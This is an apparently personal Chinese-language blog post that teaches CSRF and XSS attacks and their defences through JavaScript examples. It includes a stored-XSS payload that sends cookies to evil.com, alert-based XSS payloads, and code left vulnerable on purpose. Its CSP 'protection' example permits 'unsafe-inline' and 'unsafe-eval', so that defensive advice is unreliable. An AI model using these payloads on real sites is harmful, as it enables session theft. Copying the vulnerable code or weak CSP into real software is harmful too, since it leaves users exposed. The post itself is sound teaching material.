+++
date = '2025-01-23'
draft = false
title = 'CSRF和XSS網路攻擊'
show_reading_time=true
featured_image = '/images/CSRF和 XSS攻擊 (1).png'
categories = ["資安"]
tags = ["資安","前端","後端"]
toc=true
+++

### CSRF(Cross-Site Request Forgery)，跨站請求偽造
CSRF是一種網路安全攻擊，攻擊者利用<b>網站和使用者之間的信任</b>，
網站會信任自己登入用戶的請求，但攻擊者卻可以偽造請求，在使用者不知情的情況下，對網站發送未經授權的請求。
<!--more-->

如果覺得有點模糊......
### 舉個例子來說明攻擊流程：

#### 1.使用者登入網站
🕸️ 使用者登入了某個網站(銀行、電子郵件服務等)，並在瀏覽器中保留登入的驗證身分資料(如cookie)

#### 2.攻擊者誘導使用者訪問惡意網站
🕸️攻擊者透過電子郵件、社交媒體等，誘使使用者點擊連結，而該連結包含了<b>惡意請求</b>

#### 3.使用者的瀏覽器發送請求
🕸️ 由於使用者的瀏覽器，已經存有網站的登入狀態(通常是cookie)，當瀏覽器發送這個惡意請求時，<b>它會自動附帶使用者的身分驗證訊息</b>
讓網站認為這是一個合法請求。

#### 4.網站執行未經授權的操作
🕸️ 網站依據收到的請求，執行不應該由攻擊者操作的敏感操作，如修改密碼、轉帳、刪除資料......。

### 如何預防CSRF攻擊
💉1.CSRF Token(防範CSRF的令牌)，網站可以為每個表單生成一個唯一的CSRF Token，當用戶提交表單時，該token必須和伺服器端的token匹配，若不匹配，請求會被拒絕。

💉2.檢查HTTP Referer標頭，伺服器可以檢查HTTP請求的Referer標頭，確保請求來自受信任的網站或是來源，這樣可以防止從惡意網站發出的請求。

💉3.設定SameSite Cookie屬性，設定cookies的 `SameSite`屬性，如此一來只能在相同網站的上下文中發送，也能防止第三方網站偽造跨站請求。

💉4.確保用戶的會話在一段時間後過期，並要求用戶重新登入，減少被利用的風險。

### XSS (Cross-Site Scripting)攻擊
XSS是一種網頁安全漏洞，攻擊者可以把惡意腳本注入在網頁中，當其他用戶瀏覽該頁面時，腳本就會在用戶的瀏覽器中執行。

### XSS類型
⌨️ 反射型XSS(Reflected XSS)
- 惡意代碼包含在URL中
- 當服務器把未經處理的參數反射回頁面時觸發

```js
// 假設網址為：
https://example.com/search?q=<script>alert('hacked')</script>

// 後端直接將參數插入 HTML：
app.get('/search', (req, res) => {
    res.send(`搜索結果：${req.query.q}`);  // 危險！
});
```

⌨️ 儲存型XSS(Stroed XSS)
- 惡意代碼被儲存在伺服器中
- 當其他用戶訪問頁面時觸發

```js
// 論壇留言功能
let comment = '<script>document.location="http://evil.com/?cookie="+document.cookie</script>';
// 直接存入資料庫，顯示時未經處理
```

⌨️ DOM Based XSS
- 透過修改頁面的Dom環境來攻擊
- 不需要與伺服器交互

```js
// 危險的代碼：
document.getElementById('user').innerHTML = location.hash.substring(1);

// 攻擊 URL：
https://example.com#<img src=x onerror="alert('hacked')">
```
### 常見的攻擊目標

1.竊取用戶信息(cookiew、session tokens)  
2.竊取用戶憑證  
3.重定向到釣魚網站  
4.修改網頁內容  
5.執行惡意操作  

### 防範XSS攻擊措施

💉輸入驗證和過濾
```js
// 不好的做法
app.get('/search', (req, res) => {
    res.send(`搜索結果：${req.query.q}`);
});

// 好的做法
const sanitizeHtml = require('sanitize-html');
app.get('/search', (req, res) => {
    const cleanQuery = sanitizeHtml(req.query.q);
    res.send(`搜索結果：${cleanQuery}`);
});
```

💉輸出編碼
```js
// 手動轉義
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```
💉使用適當的HTTP Headers

```js
// 設置 Content Security Policy (CSP)
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
    );
    next();
});
```
💉HttpOnly Cookie
```js
// 設置 HttpOnly cookie
res.cookie('sessionId', 'abc123', {
    httpOnly: true,
    secure: true
});
```

💉避免直接操作DOM

```js
// 不安全的做法
element.innerHTML = userInput;

// 安全的做法
element.textContent = userInput;
```
💉React、Vue、Angular框架都內建XSS防護
- 但需注意使用 dangerouslySetInnerHTML 等特殊 API

💉正則驗證
```js
// 驗證輸入是否符合預期格式
const isValidInput = (input) => {
    return /^[a-zA-Z0-9]+$/.test(input);
};
```